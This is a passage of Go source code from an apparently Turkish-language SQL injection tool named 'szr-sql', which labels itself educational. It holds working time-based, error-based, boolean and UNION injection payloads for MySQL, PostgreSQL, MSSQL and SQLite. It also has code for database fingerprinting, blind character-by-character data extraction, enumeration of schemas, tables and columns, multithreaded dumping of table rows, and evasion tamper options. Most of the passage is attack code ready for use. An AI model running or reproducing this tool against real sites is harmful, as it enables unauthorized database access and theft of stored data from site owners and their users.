		_, t, err := i.send(i.value)
		if err != nil {
			return err
		}
		total += t
		time.Sleep(baselineSleep)
	}
	base := total / time.Duration(samples)
	i.mu.Lock()
	i.baseline = base
	i.result.Detect.BaselineSec = base.Seconds()
	i.mu.Unlock()
	i.logf("[+] Baseline: %.2fs\n", base.Seconds())
	return nil
}

func (i *Injector) DetectTimeBased() bool {
	type ctxDef struct{ name, prefix, suffix string }
	var contexts []ctxDef
	if i.injPrefix != "" || i.injSuffix != "" {
		contexts = []ctxDef{{"current", i.injPrefix, i.injSuffix}}
	} else {
		contexts = []ctxDef{
			{"int", "", "-- -"},
			{"str", "'", "-- -"},
		}
	}
	for _, ctx := range contexts {
		for _, name := range []string{"mysql", "postgresql"} {
			if i.rlAtomic.Load() {
				return false
			}
			ok := true
			for _, d := range []int{timeShort, timeLong} {
				var payload string
				if name == "mysql" {
					payload = i.value + ctx.prefix + fmt.Sprintf(" AND SLEEP(%d)", d) + ctx.suffix
				} else {
					payload = i.value + ctx.prefix + fmt.Sprintf(" AND 1=(SELECT 1 FROM pg_sleep(%d))", d) + ctx.suffix
				}
				_, t, err := i.sendSQL(payload)
				if err != nil {
					ok = false
					break
				}
				i.logf("[time:%s/%s %d] %.2fs\n", ctx.name, name, d, t.Seconds())
				if t < i.baseline+time.Duration(float64(d)*timeTolerance*float64(time.Second)) {
					ok = false
					break
				}
			}
			if ok {
				i.injPrefix, i.injSuffix = ctx.prefix, ctx.suffix
				if p, exist := profiles[name]; exist {
					i.profile = p
				}
				i.mu.Lock()
				i.result.Detect.TimeBased = true
				i.mu.Unlock()
				return true
			}
		}
	}
	return false
}

func (i *Injector) DetectErrorBased() bool {
	probes := []struct{ dbms, payload, marker string }{
		{"mysql", i.value + i.injPrefix + " AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", "~"},
		{"mysql", i.value + i.injPrefix + " AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- -", "~"},
	}
	for _, p := range probes {
		body, _, err := i.sendSQL(p.payload)
		if err != nil {
			continue
		}
		s := string(body)
		idx := strings.Index(s, p.marker)
		if idx < 0 {
			continue
		}
		end := strings.Index(s[idx+1:], p.marker)
		if end <= 0 {
			continue
		}
		version := s[idx+1 : idx+1+end]
		if !strings.ContainsAny(version, "0123456789") {
			continue
		}
		i.mu.Lock()
		i.result.DBMS.Name = p.dbms
		i.result.DBMS.Version = version
		i.result.Detect.ErrorBased = true
		i.mu.Unlock()
		i.logf("[error] %s → %s\n", p.dbms, truncate(version, 40))
		return true
	}
	return false
}

func (i *Injector) DetectUnionColumns() int {
	for n := 1; n <= maxUnionColumns; n++ {
		if i.rlAtomic.Load() {
			return 0
		}
		payload := i.value + i.injPrefix + fmt.Sprintf(" ORDER BY %d", n) + i.injSuffix
		if !i.isTrue(payload) {
			if n == 1 {
				return 0
			}
			cols := n - 1
			i.mu.Lock()
			i.result.Detect.UnionBased = true
			i.mu.Unlock()
			i.logf("[union] cols≈%d\n", cols)
			return cols
		}
	}
	return 0
}

func (i *Injector) FingerprintByError() string {
	baseBody, _, err := i.sendSQL(i.value)
	if err != nil {
		return ""
	}
	baseLen := len(baseBody)
	tests := []string{
		i.value + "'",
		i.value + "\"",
		i.value + "')",
		i.value + " AND 1=1--",
		i.value + " AND extractvalue(1,concat(0x7e,'x'))--",
	}
	for _, p := range tests {
		if i.rlAtomic.Load() {
			return ""
		}
		body, _, err := i.sendSQL(p)
		if err != nil {
			continue
		}
		if abs(len(body)-baseLen) <= 50 {
			continue
		}
		lower := strings.ToLower(string(body))
		for dbms, sigs := range dbmsErrorSignatures {
			for _, sig := range sigs {
				if strings.Contains(lower, sig) {
					i.logf("[fingerprint] %s ← %q\n", dbms, sig)
					return dbms
				}
			}
		}
	}
	return ""
}

func (i *Injector) isTrue(payload string) bool {
	body, _, err := i.sendSQL(payload)
	if err != nil {
		return false
	}
	if i.cfg.StringTrue != "" && strings.Contains(string(body), i.cfg.StringTrue) {
		return true
	}
	if i.cfg.StringFalse != "" && strings.Contains(string(body), i.cfg.StringFalse) {
		return false
	}
	h := sha256.Sum256(body)
	i.mu.Lock()
	th, fh := i.trueHash, i.falseHash
	tr, fr := i.trueRef, i.falseRef
	hasRefs := tr != nil && fr != nil
	i.mu.Unlock()
	if !hasRefs {
		return false
	}
	if h == th {
		return true
	}
	if h == fh {
		return false
	}
	dT := abs(len(body) - len(tr))
	dF := abs(len(body) - len(fr))
	return dT < dF
}

func (i *Injector) timeCond(cond string) bool {
	var payload string
	switch i.profile.Name {
	case "mysql":
		payload = i.value + i.injPrefix + fmt.Sprintf(" AND IF((%s),SLEEP(3),0)", cond) + i.injSuffix
	case "postgresql":
		payload = i.value + i.injPrefix + fmt.Sprintf(" AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN (%s) THEN 3 ELSE 0 END))", cond) + i.injSuffix
	default:
		return false
	}
	_, t, err := i.sendSQL(payload)
	if err != nil {
		return false
	}
	return t > i.baseline+2*time.Second
}

func (i *Injector) evalCond(cond string) bool {
	if i.useTime {
		return i.timeCond(cond)
	}
	return i.isTrue(i.condPayload(cond))
}

func (i *Injector) asciiAt(query string, pos int) int {
	lo, hi := asciiLow, asciiHigh+1
	for lo < hi {
		if i.rlAtomic.Load() {
			return 0
		}
		mid := (lo + hi) / 2
		sub := strings.ReplaceAll(i.profile.Substr, "{q}", query)
		sub = strings.ReplaceAll(sub, "{p}", fmt.Sprint(pos))
		asc := strings.ReplaceAll(i.profile.Ascii, "{s}", sub)
		if i.evalCond(fmt.Sprintf("%s > %d", asc, mid)) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	return lo
}

func (i *Injector) extract(query string, maxLen int) (string, error) {
	lo, hi := 0, maxLen
	for lo < hi {
		if i.rlAtomic.Load() {
			return "", errRateLimited
		}
		mid := (lo + hi) / 2
		lengthExpr := strings.ReplaceAll(i.profile.Length, "{q}", query)
		if i.evalCond(fmt.Sprintf("%s > %d", lengthExpr, mid)) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	n := lo
	if n == 0 || n > maxLen {
		return "", nil
	}
	var sb strings.Builder
	for p := 1; p <= n; p++ {
		if i.rlAtomic.Load() {
			return "", errRateLimited
		}
		c := i.asciiAt(query, p)
		if c < asciiLow || c > asciiHigh {
			break
		}
		sb.WriteByte(byte(c))
	}
	return sb.String(), nil
}

func (i *Injector) hexExpr(query string) string {
	if i.profile.HexExpr != "" {
		return fmt.Sprintf(i.profile.HexExpr, query)
	}
	return fmt.Sprintf("HEX((%s))", query)
}

func (i *Injector) extractHex(query string, maxLen int) (string, error) {
	hexQuery := i.hexExpr(query)
	hexStr, err := i.extract(hexQuery, maxLen*2)
	if err != nil {
		return "", err
	}
	if len(hexStr) == 0 || len(hexStr)%2 != 0 {
		return "", nil
	}
	out := make([]byte, 0, len(hexStr)/2)
	for j := 0; j < len(hexStr); j += 2 {
		var b byte
		if _, err := fmt.Sscanf(hexStr[j:j+2], "%02X", &b); err != nil {
			return "", err
		}
		out = append(out, b)
	}
	return string(out), nil
}

func (i *Injector) extractValue(query string, maxLen int) (string, error) {
	if i.cfg.HexExtract {
		return i.extractHex(query, maxLen)
	}
	return i.extract(query, maxLen)
}

func (i *Injector) Fingerprint() error {
	probes := []struct{ dbms, query string }{
		{"mysql", "SELECT @@version"},
		{"postgresql", "SELECT version()"},
		{"mssql", "SELECT @@version"},
		{"sqlite", "SELECT sqlite_version()"},
	}
	for _, p := range probes {
		if i.rlAtomic.Load() {
			return errRateLimited
		}
		i.profile = profiles[p.dbms]
		ver, err := i.extractValue(p.query, maxExtractLen)
		if err != nil {
			return err
		}
		if ver != "" && strings.ContainsAny(ver, "0123456789") {
			i.mu.Lock()
			i.result.DBMS.Name = p.dbms
			i.result.DBMS.Version = ver
			i.mu.Unlock()
			i.logf("[+] %s → %s\n", p.dbms, truncate(ver, 40))
			return nil
		}
	}
	i.profile = profiles["mysql"]
	i.mu.Lock()
	i.result.DBMS.Name = "mysql"
	i.mu.Unlock()
	return nil
}

func (i *Injector) saveIfSession() {
	if i.cfg.SessionFile != "" {
		_ = saveSession(i.cfg.SessionFile, i.result)
	}
}

func (i *Injector) EnumDatabases(limit int) []string {
	i.logf("\n[*] Veritabanları...\n")
	var dbs []string
	if i.profile.Name == "sqlite" {
		tabs := i.EnumTables("", limit)
		return tabs
	}
	for n := 0; n < limit; n++ {
		if i.rlAtomic.Load() {
			break
		}
		q := fmt.Sprintf("SELECT schema_name FROM %s LIMIT %d,1", i.profile.FromSchema, n)
		if i.profile.Name == "mssql" {
			q = fmt.Sprintf("SELECT schema_name FROM %s ORDER BY schema_name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", i.profile.FromSchema, n)
		}
		name, err := i.extractValue(q, maxLenName)
		if err != nil || name == "" || contains(dbs, name) {
			break
		}
		dbs = append(dbs, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Databases = dbs
	i.mu.Unlock()
	i.saveIfSession()
	return dbs
}

func (i *Injector) EnumTables(db string, limit int) []string {
	i.logf("[*] %s tabloları...\n", db)
	var tabs []string
	for n := 0; n < limit; n++ {
		if i.rlAtomic.Load() {
			break
		}
		var q string
		switch i.profile.Name {
		case "sqlite":
			q = fmt.Sprintf("SELECT name FROM sqlite_master WHERE type='table' LIMIT %d,1", n)
		case "mssql":
			q = fmt.Sprintf("SELECT table_name FROM %s WHERE table_schema='%s' ORDER BY table_name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", i.profile.FromTables, db, n)
		default:
			q = fmt.Sprintf("SELECT table_name FROM %s WHERE table_schema='%s' LIMIT %d,1", i.profile.FromTables, db, n)
		}
		name, err := i.extractValue(q, maxLenName)
		if err != nil || name == "" || contains(tabs, name) {
			break
		}
		tabs = append(tabs, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Tables[db] = tabs
	i.mu.Unlock()
	i.saveIfSession()
	return tabs
}

func (i *Injector) EnumColumns(db, table string, limit int) []string {
	i.logf("[*] %s.%s sütunları...\n", db, table)
	var cols []string
	if i.profile.Name == "sqlite" {
		q := fmt.Sprintf("SELECT sql FROM sqlite_master WHERE type='table' AND name='%s'", table)
		sqlText, err := i.extractValue(q, 2000)
		if err != nil || sqlText == "" {
			return cols
		}
		for n := 0; n < limit; n++ {
			col := crudeSQLiteColumn(sqlText, n)
			if col == "" || contains(cols, col) {
				break
			}
			cols = append(cols, col)
			i.logf("    [%d] %s\n", n, col)
		}
		i.mu.Lock()
		i.result.Columns[db+"."+table] = cols
		i.mu.Unlock()
		i.saveIfSession()
		return cols
	}
	for n := 0; n < limit; n++ {
		if i.rlAtomic.Load() {
			break
		}
		var q string
		if i.profile.Name == "mssql" {
			q = fmt.Sprintf("SELECT column_name FROM %s WHERE table_schema='%s' AND table_name='%s' ORDER BY column_name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", i.profile.FromColumns, db, table, n)
		} else {
			q = fmt.Sprintf("SELECT column_name FROM %s WHERE table_schema='%s' AND table_name='%s' LIMIT %d,1", i.profile.FromColumns, db, table, n)
		}
		name, err := i.extractValue(q, maxLenName)
		if err != nil || name == "" || contains(cols, name) {
			break
		}
		cols = append(cols, name)
		i.logf("    [%d] %s\n", n, name)
	}
	i.mu.Lock()
	i.result.Columns[db+"."+table] = cols
	i.mu.Unlock()
	i.saveIfSession()
	return cols
}

func crudeSQLiteColumn(sqlText string, n int) string {
	start := strings.Index(sqlText, "(")
	end := strings.LastIndex(sqlText, ")")
	if start < 0 || end <= start {
		return ""
	}
	inner := sqlText[start+1 : end]
	parts := strings.Split(inner, ",")
	if n >= len(parts) {
		return ""
	}
	p := strings.TrimSpace(parts[n])
	upper := strings.ToUpper(p)
	for _, kw := range []string{"PRIMARY KEY", "FOREIGN KEY", "UNIQUE", "CHECK", "CONSTRAINT"} {
		if strings.HasPrefix(upper, kw) {
			return ""
		}
	}
	fields := strings.Fields(p)
	if len(fields) == 0 {
		return ""
	}
	name := strings.Trim(fields[0], "\"`'[]")
	return name
}

type dumpJob struct{ r, c int }

func (i *Injector) Dump(db, table string, columns []string, rows int) {
	i.logf("\n[*] %s.%s dökümü (%d × %d, th=%d)\n", db, table, rows, len(columns), i.threads)
	cells := make([][]string, rows)
	for r := range cells {
		cells[r] = make([]string, len(columns))
	}
	jobs := make(chan dumpJob, i.threads*2)
	var wg sync.WaitGroup
	for w := 0; w < i.threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				if i.rlAtomic.Load() {
					return
				}
				var q string
				switch i.profile.Name {
				case "sqlite":
					q = fmt.Sprintf("SELECT %s FROM %s LIMIT %d,1", columns[j.c], table, j.r)
				case "mssql":
					q = fmt.Sprintf("SELECT %s FROM %s.%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", columns[j.c], db, table, j.r)
				default:
					q = fmt.Sprintf("SELECT %s FROM %s.%s LIMIT %d,1", columns[j.c], db, table, j.r)
				}
				val, _ := i.extractValue(q, maxExtractLen)
				cells[j.r][j.c] = val
			}
		}()
	}
enqueue:
	for r := 0; r < rows; r++ {
		if i.rlAtomic.Load() {
			break
		}
		for c := range columns {
			select {
			case jobs <- dumpJob{r, c}:
			case <-i.ctx.Done():
				break enqueue
			}
		}
	}
	close(jobs)
	wg.Wait()

	var all [][]string
	for r := 0; r < rows; r++ {
		empty := true
		for _, v := range cells[r] {
			if v != "" {
				empty = false
				break
			}
		}
		if empty {
			break
		}
		all = append(all, cells[r])
		parts := make([]string, len(columns))
		for c := range columns {
			v := cells[r][c]
			if v == "" {
				v = "<null>"
			}
			parts[c] = fmt.Sprintf("%s=%q", columns[c], v)
		}
		i.logf("    [%d] %s\n", r, strings.Join(parts, " "))
	}
	i.mu.Lock()
	i.result.Dumps[db+"."+table] = all
	i.mu.Unlock()
	i.saveIfSession()
}

func (r *Result) finalize() {
	r.EndedAt = time.Now()
	r.Duration = r.EndedAt.Sub(r.StartedAt).Round(time.Millisecond).String()
	r.Detect.Vulnerable = r.Detect.TimeBased || r.Detect.BooleanBased ||
		r.Detect.ErrorBased || r.Detect.UnionBased || r.Detect.AuthBypass
}

func saveResult(res *Result, path, outDir string) error {
	path = strings.TrimSpace(path)
	ext := strings.ToLower(filepath.Ext(path))
	if ext != ".json" && ext != ".txt" && ext != ".md" {
		if ext == "" {
			path += ".json"
			ext = ".json"
		} else {
			return fmt.Errorf("desteklenmeyen uzantı: %s", ext)
		}
	}
	if outDir != "" {
		if err := os.MkdirAll(outDir, 0755); err != nil {
			return err
		}
		path = filepath.Join(outDir, filepath.Base(path))
	}
	var data []byte
	var err error
	switch ext {
	case ".json":
		data, err = json.MarshalIndent(res, "", "  ")
	case ".txt":
		data = []byte(formatText(res))
	case ".md":
		data = []byte(formatMarkdown(res))
	}
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}
	fmt.Printf("\n[+] Sonuç → %s\n", path)
	return nil
}

func formatText(r *Result) string {
	var b strings.Builder
	w := func(f string, a ...any) { fmt.Fprintf(&b, f, a...) }
	w("=== szr-sql ===\n")
	w("Target : %s [%s]\n", r.Target.URL, r.Target.Method)
	if r.Target.Placeholder != "" {
		w("Placeholder: %s\n", r.Target.Placeholder)
	} else {
		w("Param  : %s\n", r.Target.Param)
	}
	w("Duration: %s\n\n", r.Duration)
	w("Bool=%v Time=%v Error=%v Union=%v AuthBypass=%v Vuln=%v Baseline=%.2fs\n\n",
		r.Detect.BooleanBased, r.Detect.TimeBased, r.Detect.ErrorBased,
		r.Detect.UnionBased, r.Detect.AuthBypass, r.Detect.Vulnerable, r.Detect.BaselineSec)
	if r.DBMS.Name != "" {
		w("DBMS: %s (%s)\n\n", r.DBMS.Name, r.DBMS.Version)
	}
	if len(r.Databases) > 0 {
		w("--- Databases ---\n")
		for _, d := range r.Databases {
			w("  - %s\n", d)
		}
		w("\n")
	}
	for db, tabs := range r.Tables {
		w("--- Tables [%s] ---\n", db)
		for _, t := range tabs {
			w("  - %s\n", t)
		}
		w("\n")
	}
	for k, cols := range r.Columns {
		w("--- Columns [%s] ---\n  %v\n\n", k, cols)
	}
	for k, rows := range r.Dumps {
		w("--- Dump [%s] ---\n", k)
		for i, row := range rows {
			w("  [%d] %v\n", i, row)
		}
	}
	w("\nStats: requests=%d errors=%d\n", r.Stats.Requests, r.Stats.Errors)
	return b.String()
}

func formatMarkdown(r *Result) string {
	var b strings.Builder
	w := func(f string, a ...any) { fmt.Fprintf(&b, f, a...) }
	w("# szr-sql result\n\n| Alan | Değer |\n|---|---|\n")
	w("| Target | `%s` |\n| Method | `%s` |\n", r.Target.URL, r.Target.Method)
	if r.Target.Placeholder != "" {
		w("| Placeholder | `%s` |\n", r.Target.Placeholder)
	} else {
		w("| Param | `%s` |\n", r.Target.Param)
	}
	w("| Duration | %s |\n\n", r.Duration)
	w("## Detection\n\n- Boolean: %v\n- Time: %v\n- Error: %v\n- Union: %v\n- AuthBypass: %v\n- Vulnerable: %v\n- Baseline: %.2fs\n\n",
		r.Detect.BooleanBased, r.Detect.TimeBased, r.Detect.ErrorBased,
		r.Detect.UnionBased, r.Detect.AuthBypass, r.Detect.Vulnerable, r.Detect.BaselineSec)
	if r.DBMS.Name != "" {
		w("## DBMS\n\n- **%s** `%s`\n\n", r.DBMS.Name, r.DBMS.Version)
	}
	if len(r.Databases) > 0 {
		w("## Databases\n\n")
		for _, d := range r.Databases {
			w("- `%s`\n", d)
		}
		w("\n")
	}
	for db, tabs := range r.Tables {
		w("## Tables — %s\n\n", db)
		for _, t := range tabs {
			w("- `%s`\n", t)
		}
		w("\n")
	}
	for k, cols := range r.Columns {
		w("## Columns — %s\n\n", k)
		for _, c := range cols {
			w("- `%s`\n", c)
		}
		w("\n")
	}
	for k, rows := range r.Dumps {
		w("## Dump — %s\n\n", k)
		for i, row := range rows {
			w("- Row %d: `%v`\n", i, row)
		}
		w("\n")
	}
	w("## Stats\n\n- Requests: %d\n- Errors: %d\n", r.Stats.Requests, r.Stats.Errors)
	return b.String()
}

func cloneValues(v url.Values) url.Values {
	out := url.Values{}
	for k, vv := range v {
		out[k] = append([]string{}, vv...)
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func contains(s []string, x string) bool {
	for _, v := range s {
		if v == x {
			return true
		}
	}
	return false
}

func isSystemDB(n string) bool {
	switch strings.ToLower(n) {
	case "information_schema", "mysql", "performance_schema", "sys",
		"master", "tempdb", "model", "msdb",
		"postgres", "template0", "template1", "pg_catalog", "pg_toast",
		"sqlite_sequence":
		return true
	}
	return false
}

func parseHeaderList(hs []string) map[string]string {
	out := map[string]string{}
	for _, h := range hs {
		if k, v, ok := strings.Cut(h, ":"); ok {
			out[strings.TrimSpace(k)] = strings.TrimSpace(v)
		}
	}
	return out
}

func parseTechniques(s string) map[string]bool {
	out := map[string]bool{}
	for _, c := range s {
		out[string(c)] = true
	}
	return out
}

func loadConfig(path string) (Config, error) {
	var c Config
	data, err := os.ReadFile(path)
	if err != nil {
		return c, err
	}
	if err := json.Unmarshal(data, &c); err != nil {
		return c, err
	}
	return c, nil
}

func mergeConfig(dst *Config, src Config, explicit map[string]bool) {
	if !explicit["proxy"] && dst.ProxyURL == "" {
		dst.ProxyURL = src.ProxyURL
	}
	if !explicit["max-rps"] && dst.MaxRPS == 0 {
		dst.MaxRPS = src.MaxRPS
	}
	if !explicit["auth"] && dst.AuthUser == "" {
		dst.AuthUser, dst.AuthPass = src.AuthUser, src.AuthPass
	}
	if !explicit["bearer"] && dst.AuthBearer == "" {
		dst.AuthBearer = src.AuthBearer
	}
	if !explicit["user-agent"] && dst.UserAgent == "" {
		dst.UserAgent = src.UserAgent
	}
	if !explicit["referer"] && dst.Referer == "" {
		dst.Referer = src.Referer
	}
	if !explicit["delay"] && dst.Delay == 0 {
		dst.Delay = src.Delay
	}
	if !explicit["retries"] && dst.Retries == 0 {
		dst.Retries = src.Retries
	}
	if !explicit["dbms"] && dst.DBMSForce == "" {
		dst.DBMSForce = src.DBMSForce
	}
	if !explicit["string"] && dst.StringTrue == "" {
		dst.StringTrue = src.StringTrue
	}
	if !explicit["not-string"] && dst.StringFalse == "" {
		dst.StringFalse = src.StringFalse
	}
	if !explicit["output-dir"] && dst.OutputDir == "" {
		dst.OutputDir = src.OutputDir
	}
	if !explicit["session-file"] && dst.SessionFile == "" {
		dst.SessionFile = src.SessionFile
	}
	if !explicit["technique"] && len(dst.Techniques) == 0 && src.Techniques != nil {
		dst.Techniques = src.Techniques
	}
	if !explicit["tamper"] && len(dst.TamperChain) == 0 && src.TamperChain != nil {
		dst.TamperChain = src.TamperChain
	}
	if !explicit["placeholder"] && (dst.Placeholder == "" || dst.Placeholder == "auto") && src.Placeholder != "" {
		dst.Placeholder = src.Placeholder
	}
	if !explicit["max-points"] && dst.MaxPoints == 0 {
		dst.MaxPoints = src.MaxPoints
	}
	if !explicit["header"] && len(dst.Headers) == 0 && src.Headers != nil {
		dst.Headers = map[string]string{}
		for k, v := range src.Headers {
			dst.Headers[k] = v
		}
	}
	if !explicit["total-timeout"] && dst.TotalTimeout == 0 {
		dst.TotalTimeout = src.TotalTimeout
	}
	if !explicit["allow-list"] && len(dst.ScopeAllow) == 0 {
		dst.ScopeAllow = src.ScopeAllow
	}
	if !explicit["deny-list"] && len(dst.ScopeDeny) == 0 {
		dst.ScopeDeny = src.ScopeDeny
	}
	dst.Insecure = dst.Insecure || src.Insecure
	dst.Randomize = dst.Randomize || src.Randomize
	dst.Batch = dst.Batch || src.Batch
	dst.HexExtract = dst.HexExtract || src.HexExtract
	dst.FollowRedirects = dst.FollowRedirects || src.FollowRedirects
	dst.AutoDiscover = dst.AutoDiscover || src.AutoDiscover
}

func splitTrim(s, sep string) []string {
	var out []string
	for _, p := range strings.Split(s, sep) {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

type multiFlag []string

func (m *multiFlag) String() string { return strings.Join(*m, ",") }
func (m *multiFlag) Set(v string) error {
	*m = append(*m, v)
	return nil
}

func usage() {
	fmt.Fprintf(os.Stderr, `szr-sql — eğitim amaçlı SQL injection aracı

Komutlar: scan | dbs | tables | columns | dump | all

Temel:
  -u, --url URL        hedef (zorunlu)
  -c, --cookie STR     Cookie
  -X, --method M       GET/POST
  -d, --data STR       POST body
  -e, --extra STR      ekstra query
  -p, --param NAME     enjekte parametre
  -t, --timeout SEC    zaman aşımı (30)
  -th,--threads N      paralel (1)
  -v, --verbose

Otomatik keşif:
  --no-auto            keşfi kapat
  --max-points N       denecek maksimum nokta (varsayılan 5)
  --placeholder MODE   auto | none | {custom}

HTTP:
  --proxy URL          http/socks5 proxy
  --insecure           TLS doğrulama kapalı
  --max-rps N          saniyede max istek
  --delay MS           istekler arası gecikme
  --randomize          gecikmeyi rastgeleleştir
  --retries N          ağ hatasında tekrar
  --header "K: V"      özel header (tekrarlanır)
  --user-agent UA      UA
  --referer URL        Referer
  --auth user:pass     Basic auth
  --bearer TOKEN       Bearer token
  --follow-redirects   redirect takip et

Tespit:
  --technique STR      B=bool T=time E=error U=union (varsayılan BTE)
  --tamper LIST        space2comment,randomcase,charencode,urlencode
  --dbms NAME          fingerprint atla (mysql/pg/mssql/sqlite)
  --string STR         TRUE marker
  --not-string STR     FALSE marker
  --hex                HEX ile binary extraction

Güvenlik / Kayıt:
  --allow-list HOSTS   izin verilen host'lar
  --deny-list HOSTS    yasak host'lar
  --session-file FILE  resume + otomatik kayıt
  --flush-session      session'ı sil
  --total-timeout SEC  toplam süre sınırı

Çıktı:
  -o, --output FILE    .json/.txt/.md
  --output-dir DIR     dosya buraya
  --batch              soru sorma
  --config FILE        JSON config

Sadece dump/all:
  -D, --db NAME
  -T, --table NAME
  -C, --cols a,b,c
  --rows N             (5)
  --dump-all           veri çek

Örnekler:
  szr-sql scan -u "http://t/page"
  szr-sql scan -u "http://t/page?id=1"
  szr-sql scan -u "http://t/api/{id}"
  szr-sql all -u "http://t/page?id=1" --dump-all
  szr-sql scan -u "http://t/login" -X POST -d "u=a&p=b"
`)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Print(banner)
		usage()
		os.Exit(1)
	}
	sub := os.Args[1]
	if sub == "help" || sub == "-h" || sub == "--help" {
		fmt.Print(banner)
		usage()
		return
	}
	validSubs := map[string]bool{"scan": true, "dbs": true, "tables": true, "columns": true, "dump": true, "all": true}
	if !validSubs[sub] {
		fmt.Fprintf(os.Stderr, "[-] bilinmeyen komut: %s\n", sub)
		usage()
		os.Exit(1)
	}
	fmt.Print(banner)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	args := os.Args[2:]
	fs := flag.NewFlagSet(sub, flag.ExitOnError)
	var (
		rawURL, cookie, method, data, extra, paramSel, output, db, table, cols string
		configPath, outputDir, proxyURL, authStr, bearer, dbmsForce          string
		stringTrue, stringFalse, userAgent, referer, tamperList              string
		scopeAllow, scopeDeny, sessionFile, techniqueList, placeholderMode   string
		timeout, rows, threads, maxRPS, retries, maxPoints                   int
		delayMs, totalTimeoutSec                                             int
		verbose, dumpAll, randomize, insecure, batch                         bool
		hexExtract, followRedirects, flushSession, noAuto                    bool
		headers                                                              multiFlag
	)
	fs.StringVar(&rawURL, "u", "", "")
	fs.StringVar(&rawURL, "url", "", "")
	fs.StringVar(&cookie, "c", "", "")
	fs.StringVar(&cookie, "cookie", "", "")
	fs.StringVar(&method, "X", "GET", "")
	fs.StringVar(&method, "method", "GET", "")
	fs.StringVar(&data, "d", "", "")
	fs.StringVar(&data, "data", "", "")
	fs.StringVar(&extra, "e", "", "")
	fs.StringVar(&extra, "extra", "", "")
	fs.StringVar(&paramSel, "p", "", "")
	fs.StringVar(&paramSel, "param", "", "")
	fs.IntVar(&timeout, "t", 30, "")
	fs.IntVar(&timeout, "timeout", 30, "")
	fs.IntVar(&threads, "th", 1, "")
	fs.IntVar(&threads, "threads", 1, "")
	fs.BoolVar(&verbose, "v", false, "")
	fs.BoolVar(&verbose, "verbose", false, "")
	fs.StringVar(&output, "o", "", "")
	fs.StringVar(&output, "output", "", "")
	fs.StringVar(&db, "D", "", "")
	fs.StringVar(&db, "db", "", "")
	fs.StringVar(&table, "T", "", "")
	fs.StringVar(&table, "table", "", "")
	fs.StringVar(&cols, "C", "", "")
	fs.StringVar(&cols, "cols", "", "")
	fs.IntVar(&rows, "rows", defaultRows, "")
	fs.BoolVar(&dumpAll, "dump-all", false, "")
	fs.StringVar(&configPath, "config", "", "")
	fs.StringVar(&outputDir, "output-dir", "", "")
	fs.StringVar(&proxyURL, "proxy", "", "")
	fs.BoolVar(&insecure, "insecure", false, "")
	fs.IntVar(&maxRPS, "max-rps", 0, "")
	fs.IntVar(&delayMs, "delay", 0, "")
	fs.BoolVar(&randomize, "randomize", false, "")
	fs.IntVar(&retries, "retries", 0, "")
	fs.Var(&headers, "header", "")
	fs.StringVar(&userAgent, "user-agent", "", "")
	fs.StringVar(&referer, "referer", "", "")
	fs.StringVar(&authStr, "auth", "", "")
	fs.StringVar(&bearer, "bearer", "", "")
	fs.StringVar(&dbmsForce, "dbms", "", "")
	fs.StringVar(&stringTrue, "string", "", "")
	fs.StringVar(&stringFalse, "not-string", "", "")
	fs.BoolVar(&batch, "batch", false, "")
	fs.StringVar(&tamperList, "tamper", "", "")
	fs.StringVar(&scopeAllow, "allow-list", "", "")
	fs.StringVar(&scopeDeny, "deny-list", "", "")
	fs.StringVar(&sessionFile, "session-file", "", "")
	fs.BoolVar(&flushSession, "flush-session", false, "")
	fs.StringVar(&techniqueList, "technique", "", "")
	fs.IntVar(&totalTimeoutSec, "total-timeout", 0, "")
	fs.BoolVar(&hexExtract, "hex", false, "")
	fs.BoolVar(&followRedirects, "follow-redirects", false, "")
	fs.StringVar(&placeholderMode, "placeholder", "auto", "")
	fs.BoolVar(&noAuto, "no-auto", false, "")
	fs.IntVar(&maxPoints, "max-points", defaultMaxPoints, "")

	fs.Parse(args)

	explicit := make(map[string]bool)
	fs.Visit(func(f *flag.Flag) { explicit[f.Name] = true })

	var tamperNames []string
	if tamperList != "" {
		for _, n := range strings.Split(tamperList, ",") {
			n = strings.TrimSpace(n)
			if n == "" {
				continue
			}
			if _, ok := tamperRegistry[n]; !ok {
				fmt.Fprintf(os.Stderr, "[-] bilinmeyen tamper: %s\n", n)
				os.Exit(1)
			}
			tamperNames = append(tamperNames, n)
		}
	}

	cfg := Config{
		ProxyURL: proxyURL, Insecure: insecure, MaxRPS: maxRPS,
		Headers: parseHeaderList(headers), UserAgent: userAgent, Referer: referer,
		Delay: time.Duration(delayMs) * time.Millisecond, Randomize: randomize,
		Retries: retries, DBMSForce: dbmsForce,
		StringTrue: stringTrue, StringFalse: stringFalse, Batch: batch,
		OutputDir: outputDir, SessionFile: sessionFile,
		Techniques: parseTechniques(techniqueList),
		TotalTimeout: time.Duration(totalTimeoutSec) * time.Second,
		HexExtract: hexExtract, FollowRedirects: followRedirects,
		TamperChain: tamperNames, Placeholder: placeholderMode,
		AutoDiscover: !noAuto, MaxPoints: maxPoints,
	}
	if configPath != "" {
		fileCfg, err := loadConfig(configPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] config: %v\n", err)
			os.Exit(1)
		}
		mergeConfig(&cfg, fileCfg, explicit)
	}
	if authStr != "" {
		u, p, _ := strings.Cut(authStr, ":")
		cfg.AuthUser, cfg.AuthPass = u, p
	}
	cfg.AuthBearer = bearer

	if rawURL == "" {
		fmt.Fprintln(os.Stderr, "[-] -u/--url zorunlu")
